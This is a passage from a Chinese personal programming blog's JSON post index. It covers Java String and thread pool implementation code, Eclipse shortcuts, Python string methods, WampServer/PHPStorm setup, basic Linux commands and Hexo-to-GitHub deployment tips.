“abc”；的格式定义类时，总是想当然地认为，我们创建了String类的对象str。担心陷阱！对象可能并没有被创建！唯一可以肯定的是，指向String类的引用被创建了。至于这个引用到底是否指向了一个新的对象，必须根据上下文来考虑，除非你通过new()方法来显要地创建一个新的对象。因此，更为准确的说法是，我们创建了一个指向String类的对象的引用变量str，这个对象引用变量指向了某个值为”abc”的String类。清醒地认识到这一点对排除程序中难以发现的bug是很有帮助的。 (2)使用String str = “abc”；的方式，可以在一定程度上提高程序的运行速度，因为JVM会自动根据栈中数据的实际情况来决定是否有必要创建新对象。而对于String str = new String(“abc”)；的代码，则一概在堆中创建新对象，而不管其字符串值是否相等，是否有必要创建新对象，从而加重了程序的负担。这个思想应该是享元模式的思想，但JDK的内部在这里实现是否应用了这个模式，不得而知。 (3)当比较包装类里面的数值是否相等时，用equals()方法；当测试两个包装类的引用是否指向同一个对象时，用==。 (4)由于String类的immutable性质，当String变量需要经常变换其值时，应该考虑使用StringBuffer类，以提高程序效率。","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"JavaThread","date":"2016-09-25T01:09:39.000Z","path":"2016/09/25/JavaThread/","text":"Java 线程池的原理与实现最近在学习线程池、内存控制等关于提高程序运行性能方面的编程技术，在网上看到有一哥们写得不错，故和大家一起分享。 [分享]Java 线程池的原理与实现 这几天主要是狂看源程序，在弥补了一些以前知识空白的同时，也学会了不少新的知识（比如 NIO），或者称为新技术吧。线程池就是其中之一，一提到线程，我们会想到以前《操作系统》的生产者与消费者，信号量，同步控制等等。一提到池，我们会想到数据库连接池，但是线程池又如何呢？ 建议：在阅读本文前，先理一理同步的知识，特别是syncronized同步关键字的用法。关于我对同步的认识，要缘于大三年的一本书，书名好像是 Java 实战，这本书写得实在太妙了，真正的从理论到实践，从截图分析到.class字节码分析。哇，我想市场上很难买到这么精致的书了。作为一个Java爱好者，我觉得绝对值得一读。我对此书印象最深之一的就是：equal()方法，由浅入深，经典！还有就是同步了，其中提到了我的几个编程误区，以前如何使用同步提高性能等等，通过学习，使我对同步的认识进一步加深。 简单介绍 创建线程有两种方式：继承Thread或实现Runnable。Thread实现了Runnable接口，提供了一个空的run()方法，所以不论是继承Thread还是实现Runnable，都要有自己的run()方法。 一个线程创建后就存在，调用start()方法就开始运行（执行run()方法），调用wait进入等待或调用sleep进入休眠期，顺利运行完毕或休眠被中断或运行过程中出现异常而退出。 wait和sleep比较： sleep方法有：sleep(long millis)，sleep(long millis, long nanos)，调用sleep方法后，当前线程进入休眠期，暂停执行，但该线程继续拥有监视资源的所有权。到达休眠时间后线程将继续执行，直到完成。若在休眠期另一线程中断该线程，则该线程退出。 wait方法有：wait()，wait(long timeout)，wait(long timeout, long nanos)，调用wait方法后，该线程放弃监视资源的所有权进入等待状态； wait()：等待有其它的线程调用notify()或notifyAll()进入调度状态，与其它线程共同争夺监视。wait()相当于wait(0)，wait(0, 0)。 wait(long timeout)：当其它线程调用notify()或notifyAll()，或时间到达timeout亳秒，或有其它某线程中断该线程，则该线程进入调度状态。 wait(long timeout, long nanos)：相当于wait(1000000*timeout + nanos)，只不过时间单位为纳秒。 线程池： 多线程技术主要解决处理器单元内多个线程执行的问题，它可以显著减少处理器单元的闲置时间，增加处理器单元的吞吐能力。 假设一个服务器完成一项任务所需时间为：T1 创建线程时间，T2 在线程中执行任务的时间，T3 销毁线程时间。 如果：T1 + T3 远大于 T2，则可以采用线程池，以提高服务器性能。 一个线程池包括以下四个基本组成部分： 1、线程池管理器（ThreadPool）：用于创建并管理线程池，包括 创建线程池，销毁线程池，添加新任务； 2、工作线程（PoolWorker）：线程池中线程，在没有任务时处于等待状态，可以循环的执行任务； 3、任务接口（Task）：每个任务必须实现的接口，以供工作线程调度任务的执行，它主要规定了任务的入口，任务执行完后的收尾工作，任务的执行状态等； 4、任务队列（taskQueue）：用于存放没有处理的任务。提供一种缓冲机制。 线程池技术正是关注如何缩短或调整T1,T3时间的技术，从而提高服务器程序性能的。它把T1，T3分别安排在服务器程序的启动和结束的时间段或者一些空闲的时间段，这样在服务器程序处理客户请求时，不会有T1，T3的开销了。 线程池不仅调整T1,T3产生的时间段，而且它还显著减少了创建线程的数目，看一个例子： 假设一个服务器一天要处理50000个请求，并且每个请求需要一个单独的线程完成。在线程池中，线程数一般是固定的，所以产生线程总数不会超过线程池中线程的数目，而如果服务器不利用线程池来处理这些请求则线程总数为50000。一般线程池大小是远小于50000。所以利用线程池的服务器程序不会为了创建50000而在处理请求时浪费时间，从而提高效率。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324/** 线程池类，工作线程作为其内部类 **/package org.ymcn.util;import java.util.Collections;import java.util.Date;import java.util.LinkedList;import java.util.List;import org.apache.log4j.Logger;/*** 线程池* 创建线程池，销毁线程池，添加新任务* * @author obullxl*/public final class ThreadPool &#123; private static Logger logger = Logger.getLogger(ThreadPool.class); private static Logger taskLogger = Logger.getLogger(\"TaskLogger\"); private static boolean debug = taskLogger.isDebugEnabled(); // private static boolean debug = taskLogger.isInfoEnabled(); /* 单例 */ private static ThreadPool instance = ThreadPool.getInstance(); public static final int SYSTEM_BUSY_TASK_COUNT = 150; /* 默认池中线程数 */ public static int worker_num = 5; /* 已经处理的任务数 */ private static int taskCounter = 0; public static boolean systemIsBusy = false; private static List&lt;Task&gt; taskQueue = Collections .synchronizedList(new LinkedList&lt;Task&gt;()); /* 池中的所有线程 */ public PoolWorker[] workers; private ThreadPool() &#123; workers = new PoolWorker[5]; for (int i = 0; i &lt; workers.length; i++) &#123; workers[i] = new PoolWorker(i); &#125; &#125; private ThreadPool(int pool_worker_num) &#123; worker_num = pool_worker_num; workers = new PoolWorker[worker_num]; for (int i = 0; i &lt; workers.length; i++) &#123; workers[i] = new PoolWorker(i); &#125; &#125; public static synchronized ThreadPool getInstance() &#123; if (instance == null) return new ThreadPool(); return instance; &#125; /** * 增加新的任务 * 每增加一个新任务，都要唤醒任务队列 * @param newTask */ public void addTask(Task newTask) &#123; synchronized (taskQueue) &#123; newTask.setTaskId(++taskCounter); newTask.setSubmitTime(new Date()); taskQueue.add(newTask); /* 唤醒队列, 开始执行 */ taskQueue.notifyAll(); &#125; logger.info(\"Submit Task&lt;\" + newTask.getTaskId() + \"&gt;: \" + newTask.info()); &#125; /** * 批量增加新任务 * @param taskes */ public void batchAddTask(Task[] taskes) &#123; if (taskes == null || taskes.length == 0) &#123; return; &#125; synchronized (taskQueue) &#123; for (int i = 0; i &lt; taskes.length; i++) &#123; if (taskes[i] == null) &#123; continue; &#125; taskes[i].setTaskId(++taskCounter); taskes[i].setSubmitTime(new Date()); taskQueue.add(taskes[i]); &#125; /* 唤醒队列, 开始执行 */ taskQueue.notifyAll(); &#125; for (int i = 0; i &lt; taskes.length; i++) &#123; if (taskes[i] == null) &#123; continue; &#125; logger.info(\"Submit Task&lt;\" + taskes[i].getTaskId() + \"&gt;: \" + taskes[i].info()); &#125; &#125; /** * 线程池信息 * @return */ public String getInfo() &#123; StringBuffer sb = new StringBuffer(); sb.append(\"\\nTask Queue Size:\" + taskQueue.size()); for (int i = 0; i &lt; workers.length; i++) &#123; sb.append(\"\\nWorker \" + i + \" is \" + ((workers[i].isWaiting()) ? \"Waiting.\" : \"Running.\")); &#125; return sb.toString(); &#125; /** * 销毁线程池 */ public synchronized void destroy() &#123; for (int i = 0; i &lt; worker_num; i++) &#123; workers[i].stopWorker(); workers[i] = null; &#125; taskQueue.clear(); &#125; /** * 池中工作线程 * * @author obullxl */ private class PoolWorker extends Thread &#123; private int index = -1; /* 该工作线程是否有效 */ private boolean isRunning = true; /* 该工作线程是否可以执行新任务 */ private boolean isWaiting = true; public PoolWorker(int index) &#123; this.index = index; start(); &#125; public void stopWorker() &#123; this.isRunning = false; &#125; public boolean isWaiting() &#123; return this.isWaiting; &#125; /** * 循环执行任务 * 这也许是线程池的关键所在 */ public void run() &#123; while (isRunning) &#123; Task r = null; synchronized (taskQueue) &#123; while (taskQueue.isEmpty()) &#123; try &#123; /* 任务队列为空，则等待有新任务加入从而被唤醒 */ taskQueue.wait(20); &#125; catch (InterruptedException ie) &#123; logger.error(ie); &#125; &#125; /* 取出任务执行 */ r = (Task) taskQueue.remove(0); &#125; if (r != null) &#123; isWaiting = false; try &#123; if (debug) &#123; r.setBeginExceuteTime(new Date()); taskLogger.debug(\"Worker&lt;\" + index + \"&gt; start execute Task&lt;\" + r.getTaskId() + \"&gt;\"); if (r.getBeginExceuteTime().getTime() - r.getSubmitTime().getTime() &gt; 1000) taskLogger.debug(\"longer waiting time. \" + r.info() + \",&lt;\" + index + \"&gt;,time:\" + (r.getFinishTime().getTime() - r .getBeginExceuteTime().getTime())); &#125; /* 该任务是否需要立即执行 */ if (r.needExecuteImmediate()) &#123; new Thread(r).start(); &#125; else &#123; r.run(); &#125; if (debug) &#123; r.setFinishTime(new Date()); taskLogger.debug(\"Worker&lt;\" + index + \"&gt; finish task&lt;\" + r.getTaskId() + \"&gt;\"); if (r.getFinishTime().getTime() - r.getBeginExceuteTime().getTime() &gt; 1000) taskLogger.debug(\"longer execution time. \" + r.info() + \",&lt;\" + index + \"&gt;,time:\" + (r.getFinishTime().getTime() - r .getBeginExceuteTime().getTime())); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); logger.error(e); &#125; isWaiting = true; r = null; &#125; &#125; &#125; &#125;&#125;/** 任务接口类 **/package org.ymcn.util;import java.util.Date;/*** 所有任务接口* 其他任务必须继承访类* * @author obullxl*/public abstract class Task implements Runnable &#123; // private static Logger logger = Logger.getLogger(Task.class); /* 产生时间 */ private Date generateTime = null; /* 提交执行时间 */ private Date submitTime = null; /* 开始执行时间 */ private Date beginExceuteTime = null; /* 执行完成时间 */ private Date finishTime = null; private long taskId; public Task() &#123; this.generateTime = new Date(); &#125; /** * 任务执行入口 */ public void run() &#123; /** * 相关执行代码 * * beginTransaction(); * * 执行过程中可能产生新的任务 subtask = taskCore(); * * commitTransaction(); * * 增加新产生的任务 ThreadPool.getInstance().batchAddTask(taskCore()); */ &#125; /** * 所有任务的核心 所以特别的业务逻辑执行之处 * * @throws Exception */ public abstract Task[] taskCore() throws Exception; /** * 是否用到数据库 * * @return */ protected abstract boolean useDb(); /** * 是否需要立即执行 * * @return */ protected abstract boolean needExecuteImmediate(); /** * 任务信息 * * @return String */ public abstract String info(); public Date getGenerateTime() &#123; return generateTime; &#125; public Date getBeginExceuteTime() &#123; return beginExceuteTime; &#125; public void setBeginExceuteTime(Date beginExceuteTime) &#123; this.beginExceuteTime = beginExceuteTime; &#125; public Date getFinishTime() &#123; return finishTime; &#125; public void setFinishTime(Date finishTime) &#123; this.finishTime = finishTime; &#125; public Date getSubmitTime() &#123; return submitTime; &#125; public void setSubmitTime(Date submitTime) &#123; this.submitTime = submitTime; &#125; public long getTaskId() &#123; return taskId; &#125; public void setTaskId(long taskId) &#123; this.taskId = taskId; &#125;&#125;","tags":[{"name":"java thread","slug":"java-thread","permalink":"http://yoursite.com/tags/java-thread/"}]},{"title":"eclipseEditorAsisst","date":"2016-09-16T02:30:50.000Z","path":"2016/09/16/eclipseEditorAsisst/","text":"在eclipse中编辑java项目的编辑帮助和一些热键1.增强Eclipse（MyEclipse）输入代码提示功能(1). 打开Eclipse，选择打开” Window －－ Preferences”。 (2). 在目录树上选择”Java－－Editor－－Content Assist”，在右侧的”Auto-Activation”找到”Auto Activation triggers for java”选项。默认触发代码提示的就是”.”这个符号。(3). 在”Auto Activation triggers for java”选项中，在”.”后加上qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM字母。然后”Apply”，点击”OK” 2.一些热键(1)Ctrl+Space 说明:内容助理。提供对方法,变量,参数,javadoc等得提示,应运在多种场合,总之需要提示的时候可先按此快捷键。注:避免输入法的切换设置与此设置冲突 (2)Ctrl+Shift+Space 说明:变量提示 (3)Ctrl+/ 说明:添加/消除//注释,在eclipse2.0中,消除注释为Ctrl+\\ (4)Ctrl+Shift+/ 说明:添加/ /注释 (5)Ctrl+Shift+\\ 说明:消除/ /注释 (6)Ctrl+Shift+F 说明:自动格式化代码 (7)Ctrl+1 说明:批量修改源代码中的变量名,此外还可用在catch块上. (8)Ctril+F6 说明:界面切换 (9)Ctril+Shift+M 说明:查找所需要得包 (10)Ctril+Shift+O 说明:自动引入所需要得包 (11)Ctrl+Alt+S 说明:源代码得快捷菜单。其中的Generate getters and setters 和 Surround with try/catchblock比较常用.建议把它们添加为快捷键.快捷键设置在windows-&gt;preferences-&gt;Workbench-&gt;Keys 2. 快捷键列表编辑作用域 功能 快捷键 行 删除一行 Ctrl+D 全局 查找并替换 Ctrl+F 文本编辑器 查找上一个 Ctrl+Shift+K 文本编辑器 查找下一个 Ctrl+K 全局 撤销 Ctrl+Z 全局 复制 Ctrl+C 全局 恢复上一个选择 Alt+Shift+↓ 全局 剪切 Ctrl+X 全局 快速修正 Ctrl1+1 全局 内容辅助 Alt+/ 全局 全部选中 Ctrl+A 全局 删除 Delete 全局 上下文信息 Alt+？Alt+Shift+?Ctrl+Shift+Space Java编辑器 显示工具提示描述 F2 Java编辑器 选择封装元素 Alt+Shift+↑ Java编辑器 选择上一个元素 Alt+Shift+← Java编辑器 选择下一个元素 Alt+Shift+→ 文本编辑器 增量查找 Ctrl+J 文本编辑器 增量逆向查找 Ctrl+Shift+J 全局 粘贴 Ctrl+V 全局 重做 Ctrl+Y 查看作用域 功能 快捷键 全局 放大 Ctrl+= 全局 缩小 Ctrl+- 窗口作用域 功能 快捷键 全局 激活编辑器 F12 全局 切换编辑器 Ctrl+Shift+W 全局 上一个编辑器 Ctrl+Shift+F6 全局 上一个视图 Ctrl+Shift+F7 全局 上一个透视图 Ctrl+Shift+F8 全局 下一个编辑器 Ctrl+F6 全局 下一个视图 Ctrl+F7 全局 下一个透视图 Ctrl+F8 文本编辑器 显示标尺上下文菜单 Ctrl+W 全局 显示视图菜单 Ctrl+F10 全局 显示系统菜单 Alt+- 导航作用域 功能 快捷键 Java编辑器 打开结构 Ctrl+F3 全局 打开类型 Ctrl+Shift+T 全局 打开类型层次结构 F4 全局 打开声明 F3 全局 打开外部javadoc Shift+F2 全局 打开资源 Ctrl+Shift+R 全局 后退历史记录 Alt+← 全局 前进历史记录 Alt+→ 全局 上一个 Ctrl+, 全局 下一个 Ctrl+. Java编辑器 显示大纲 Ctrl+O 全局 在层次结构中打开类型 Ctrl+Shift+H 全局 转至匹配的括号 Ctrl+Shift+P 全局 转至上一个编辑位置 Ctrl+Q Java编辑器 转至上一个成员 Ctrl+Shift+↑ Java编辑器 转至下一个成员 Ctrl+Shift+↓ 文本编辑器 转至行 Ctrl+L 搜索作用域 功能 快捷键 全局 出现在文件中 Ctrl+Shift+U 全局 打开搜索对话框 Ctrl+H 全局 工作区中的声明 Ctrl+G 全局 工作区中的引用 Ctrl+Shift+G 文本编辑作用域 功能 快捷键 文本编辑器 改写切换 Insert 文本编辑器 上滚行 Ctrl+↑ 文本编辑器 下滚行 Ctrl+↓ 文件作用域 功能 快捷键 全局 保存 Ctrl+X Ctrl+S 全局 打印 Ctrl+P 全局 关闭 Ctrl+F4 全局 全部保存 Ctrl+Shift+S 全局 全部关闭 Ctrl+Shift+F4 全局 属性 Alt+Enter 全局 新建 Ctrl+N 项目作用域 功能 快捷键 全局 全部构建 Ctrl+B 源代码 作用域 功能 快捷键 Java编辑器 格式化 Ctrl+Shift+F Java编辑器 取消注释 Ctrl+\\ Java编辑器 注释 Ctrl+/ Java编辑器 添加导入 Ctrl+Shift+M Java编辑器 组织导入 Ctrl+Shift+O Java编辑器 使用try/catch块来包围 未设置，太常用了，所以在这里列出,建议自己设置。也可以使用Ctrl+1自动修正。 运行作用域 功能 快捷键 全局 单步返回 F7 全局 单步跳过 F6 全局 单步跳入 F5 全局 单步跳入选择 Ctrl+F5 全局 调试上次启动 F11 全局 继续 F8 全局 使用过滤器单步执行 Shift+F5 全局 添加/去除断点 Ctrl+Shift+B 全局 显示 Ctrl+D 全局 运行上次启动 Ctrl+F11 全局 运行至行 Ctrl+R 全局 执行 Ctrl+U重构作用域 功能 快捷键 全局 撤销重构 Alt+Shift+Z 全局 抽取方法 Alt+Shift+M 全局 抽取局部变量 Alt+Shift+L 全局 内联 Alt+Shift+I 全局 移动 Alt+Shift+V 全局 重命名 Alt+Shift+R 全局 重做 Alt+Shift+Y","tags":[{"name":"eclipseForJava","slug":"eclipseForJava","permalink":"http://yoursite.com/tags/eclipseForJava/"}]},{"title":"operate","date":"2016-09-14T08:49:00.000Z","path":"2016/09/14/operate/","text":"###python字符串中字符大小写的变换： S.lower() 小写 S.upper() 大写 S.swapcase() 大小写互换 S.capitalize() 首字母大写 String.capwords(S)这是模块中的方法。它把S用split()函数分开，然后用capitalize()把首字母变成大写，最后用join()合并到一起 S.title()只有首字母大写，其余为小写，模块中没有这个方法字符串在输出时的对齐： S.ljust(width,[fillchar])输出width个字符，S左对齐，不足部分用fillchar填充，默认的为空格。 S.rjust(width,[fillchar])右对齐 S.center(width, [fillchar])中间对齐 S.zfill(width)把S变成width长，并在右对齐，不足部分用0补足","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"error","date":"2016-05-21T13:50:36.000Z","path":"2016/05/21/error/","text":"IndentationError: expected an indented block 解决方法：此时只需要在print前面加tab键就可以了，即：后面需要缩进。","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"php_install","date":"2016-05-14T09:22:42.000Z","path":"2016/05/14/php-install/","text":"PHPstorm安装问题 1.安装phpStorm 2.打开并运行一个小程序 3.出现了这么一个问题 4.回头看看phpstorm编辑器，发现这个错误 接下来开始解决 首先点击file-&gt;settings-&gt;language &amp; framework-&gt;php 或则如图直接进入 然后点击 找到php解释器路径（我的方案是wamp中的php解释器），如图 点击 apply ok 即可 最后 当你运行时，浏览器中出现 说明已经成功了 tips：建议预先安装wamp集成包","tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"install wampServer","date":"2016-05-03T05:00:20.000Z","path":"2016/05/03/install-wampServer/","text":"The solution to the problems when Installed wampServer on win8.1.一.when launched it,a problem show up: *** ERROR *** The PHP configuration loaded file is: - should be: D:/wamp/bin/apache/apache2.4.17/bin/php.ini or d:/wamp/bin/php/php5.6.15/phpforapache.ini here is the solution:请先退出wampServer 1.以管理员身份运行cmd.exe 进入C:\\windows\\system32\\ -&gt; 找到cmd.exe -&gt; 右击并且以管理员身份运行 2.键入命令进入安装apache的目录 我的是 D:\\wamp\\bin\\apache\\apache2.4.17\\bin 3.创建软连接 mklink php.ini d:\\wamp\\bin\\php\\php5.6.15\\phpForApache.ini 成功之后你会看到 为php.ini &lt;&lt; === &gt;&gt; d:\\wamp\\bin\\php\\php5.6.15\\phpForApache.ini 创建的符号链接","tags":[{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"linux foundation","date":"2016-05-01T15:47:21.000Z","path":"2016/05/01/linux-foundation/","text":"linux特点1.所有内容以文件存储 2.区分大小写 3.不区分拓展名 4.win下程序不能直接在linux上安装和运行 为什么服务器端用linux服务器端要求:安全，稳定 优势一：字符界面占用的系统资源更少 优势二：字符界面减少错误和被攻击的可能性 磁盘分区（把大硬盘分成小的逻辑分区）1.主分区最多只有4个 2.拓展分区：最多只有一个 1.主分区和拓展分区最多有四个 2.不能写入数据，只能包含逻辑分区 3.格式化：写入文件系统 设置， 数据块（block） 【表】节点（node） 4.分区设备文件名：（给每个分区定义设备文件名） 5.挂载：（给每个分区分配挂载点）//分区，目录结合叫挂载 pwd 显示当前目录 tab 目录补全和命令补全 date 显示系统时间 ls -i [文件一] [文件二] 查看文件的inode信息 ctrl+L 清屏 linux命令目录处理命令 0.ls -l 详细信息 可简写为 ll 1.mkdir -p [目录名] -p递归创建，如 Japanese/erpha 一次创建完成 2.cd [目录] cd ~ 进入当前用户的家目录。和直接使用cd一样 cd - 进入上次目录 cd .. 进入上一级目录 cd . 进入当前目录 3.rmdir [空白目录] rm -rf [任意目录] -r删目录-f强制 4.cp 复制 cp -r 复制目录 cp -p 连带文件属性复制 cp -d 若原文件是链接文件，则复制连接属性 cp -a 相当于 -pdr 5.mv [原文见或目录] [目标目录（同目录下为改名，不同目录下为剪切)] 剪切或改名命令 6.ln -s [原文件绝对路径] [目标文件] 连接处理命令(-s 创建软链接，不加的话就是创建硬链接) 软连接类似于win下的快捷方式 有自己的icode 搜索命令 1.locate [文件名]文件搜索命令 在/var/lib/mlocate后台数据库中搜索，该数据库一天更新一次，当然也可以用updatedb强制更新该数据库 2.whereis与which搜索命令的命令-b只看在哪-m只看帮助文档 which查到的是位置和别名 echo $PATH 3.find [搜索范围] -name(/-iname/-user/-nouser/-mtime/-ctime/-atime/-size/-inum)[搜索条件] 按照文件名搜索 完全匹配，可以用通配符模糊查询 4.grep (-v排除指定字符串/-i忽略大小写)[选项] 字符串 文件名 正则表达式包含匹配 帮助命令 1.man 命令 man -f 命令=whatis 命令 （查看命令拥有哪个级别的帮助） man -k 命令=apropos 命令 （查看和命令相关的所有帮助） 2.其他帮助命令 命令 -help选项帮助 help shell内部命令 eg：help cd and help whereis cd info 命令 -回车 进入子帮助页面（带有*好标记） -u 进入上层页面 -n 进入下一个帮助小节 -p 进入上一个帮助小节 -q 退出 压缩与解压缩命令 .zip zip/unzip (-r压缩目录的选项) 压缩文件名 源文件 .gz gzip （-r压缩目录下的所有子文件） 源文件 压缩完源文件将消失 gunzip （-r解压缩目录） 压缩包 .bz2 bzip2 原文件 原文件会消失，想保留原文件加-r选项 不能压缩目录 bunzip2 压缩包 加-k选项的话，压缩包会保留 tar 打包命令（常用） tar -cvf 打包文件名 源文件-c打包-v显示过程-f指定打包后的文件名 tar -xvf 打包文件名 -x解打包-t为查看压缩包内内容 tar -zcvf 压缩包名.tar.gz 原文件 -z压缩为.tar.gz格式 -c换成-x为解压 tar -jcvf 压缩包名.tar.bz2 原文件 压缩包名可以指定路径 tar -jxvf 压缩包名 -C 目录 解压到指定目录 .tar.gz .tar.bz2 关机与重启命令 shutdown [选项] 时间 [&amp;] -c取消前一个关机命令-h关机-r重启&amp;后台启动 下面一般会又损害 关机 halt poweroff init 0 重启 init 6 reboot 退出登录（注销） logout runlevel当前系统运行级别查询init 级别 cat /etc/inittab 修改系统默认运行级别 其他命令 1.挂载命令 mount查看已经挂载的分区 mount -a 依据/etc/fstab/的内容，自动挂载。 1挂载命令格式 mount [-t文件系统] [-o特殊选项] 设备文件名 挂载点 2挂在光盘 mkdir /mut/cdrom/ 创建挂载点（挂在店必须是空目录） mount -t iso9660 /dev/sr0 /mnt/cdrom/ =mount /dev/sr0 /mnt/cdrom/ 简化版 3卸载命令 umount 设备文件名或挂载点 4U盘挂载 fdisk -l 查看系统中已经识别的硬盘 mount -t vfat /dev/sdb1/mnt/usb/ linux默认不支持BTFS文件系统 2.用户登录查看和用户交互命令 w who 简单显示 last 查询当前登录和过去登陆的用户信息 lastlog 查看所有用户的最后一次登录时间 shell基础 shell：命令行解释器 脚本执行方法 echo [选项] [要输出的内容] -e 支持转义字符 echo “zifuchuan ” 输出字符串 echo -e “\\e[1;31m 字符串 \\e[0m” 开启颜色显示颜色值为31m 写脚本 vi 文件名 进入编辑后开始的第一行必须是#!/bin/bash 注释用# 脚本执行 赋予执行权限，直接执行 chmod 755 文件名 ./文件名（相对路径，也可以写绝对路径） 通过bash调用执行脚本 bash 文件名(加路径) bash的基本功能 1.命令别名与快捷键 查看别名 alias 查看系统中已经生效的别名 设定别名 alias 别名=&apos;准确格式的原命令&apos; （注销就不起作用了，永久设置的话，要写入环境变量配置文件 vim ~/.bashrc 也可以直接写入bashrc文件，在source就行了） 删除别名 unalias 命令生效顺序 含路径命令 &gt; 别名 &gt; bash内部命令 &gt; 外部$PATH命令 2.历史命令 history 查看输入过的所有命令 !n 重复执行第n条命令 !!重复执行最后一个命令 !字符串 重复执行以字符串开始的命令 history [选项] [历时命令保存文件] -w强制写入当前命令的历史记录-c清除所有命令 3.输出重定向 指定输出内容的地方 &gt; 覆盖方式 &gt;&gt; 追加的方式 2&gt;&gt;标准错误输出（追加，2&gt;覆盖） *命令 &gt;&gt; 文件 2&gt;&amp;1 如果命令是正确的，则直接写入文件中，错误的，就把报错写入到文件中 *命令 &amp;&gt;&gt;文件名 或则命令 &amp;&gt;文件名 *命令 &gt;&gt; 文件1 2&gt;&gt;文件2 正确信息保存到文件1中错误信息保存到文件2中 输入重定向 wc [选项] [文件名] 最后按下ctrl+d/w/l统计 4.多命令顺序执行 ；顺序执行分号两边的命令 &amp;&amp;两边命令都正确才执行 ||两边命令只要有一个正确的就执行 | 管道符 用法 命令1 | 命令2,命令1的结果作为命令2的操作对象 eg:ls -l /etc | more netstat -an | grep &quot;ESTABLISHED&quot; 查询网络连接中包含ESTA...的行 5.shell中特殊符号 通配符 ? * [] 其他特殊符号 常用快捷键 ctrl + c 强制终止当前命令 ctrl + l 清屏 ctrl + a 光标移动到命令行首 ctrl + e 光标移动到命令行尾 ctrl + u 从光标所在位置删除到行首 ctrl + z 把命令放入后台 ctrl + r 在历时命令中搜索 17/4/17日更新 几张linux命令图 ps： 具体视频请参看imooc中linux达人","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"博客链接","date":"2016-04-22T04:03:36.000Z","path":"2016/04/22/links/","text":"1.Java paradise的博客 2.hexo的详解3.moxfive的博客","tags":[{"name":"links","slug":"links","permalink":"http://yoursite.com/tags/links/"}]},{"title":"初次部署hexo到github上","date":"2016-04-20T09:49:21.000Z","path":"2016/04/20/my-first-post/","text":"部署hexo到github上时遇到了很多问题，搞了两天 一. 错误归结于 deploy： type：github//错误的（有些网上的教程不知道为什么在我这里错了） type：git//正确的（stackflow上查到的） 还要提醒一点repository的设置必须是ssh的协议的url，不是http协议的url 二.我的设置如下 repository: git@github.com:tellen7/tellen7.github.io.git branch: master//部署到master分支上 NOTE 如果你是为一个项目制作网站，那么需要把branch设置为gh-pages。 三.配置时区错误 timezone: 如果设置不对，将提示这种错误 TypeError: Cannot read property ‘offset’ of null 并且提示 See http://momentjs.com/timezone/docs/#/data-loading/. 所以我没有设置 _ warming 1.配置hexo根目录下的_config.yml文件时要参看官方文档，不要轻易随便改动配置文件 2.如果希望将_config.yml文件中的subtitle:属性值中文内容显示必须将 _config.yml文件编码形式改为 UTF-8 格式。如果用记事本编辑，在 另存为 步骤中修改编码。不过推荐用sublime 打开配置为文件，其支持语法高亮。 3.关于主题配置请参看文档。说明一点，当使用git clone时，应该在 hexo根目录 下打开git bash。应用主题时只要在_config.yml文件中更改 theme:就行了。 4.如果想给自己的文章加标签，那么可以直接在文章中的tags:出添加你想要的标签，不过要切记tags:和标签之间要留一个空格，否者会出现如下错误 YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1: 一定要留空格！！！！这是一个大坑！ 5.其他错误看看这篇博客能不能帮到。 tips 执行hexo New [layout] “new post name”之后会在hexo根目录下的source文件中的_post中生成New post name的markdown文件，用能编辑markdown文件的编辑器打开编辑好保存之后在hexo g(生成静态网页)-&gt;hexo s[可有可无] (localhost:4000中查看效果，不满意再编辑，编辑好之后再 hexo g)-&gt;hexo d(部署到github上) 关于hexo s命令行，可以在markdown编辑文件中直接察看文档效果就行了，完全可以忽略。但是，当你月到错误时，在这个环节查看错无也是必不可少的！ 这里给出了更多主题，知乎上的和github上的。喜欢哪个就用哪个吧。","tags":[{"name":"hexo","slug":"hexo","permalink":"http://yoursite.com/tags/hexo/"}]}]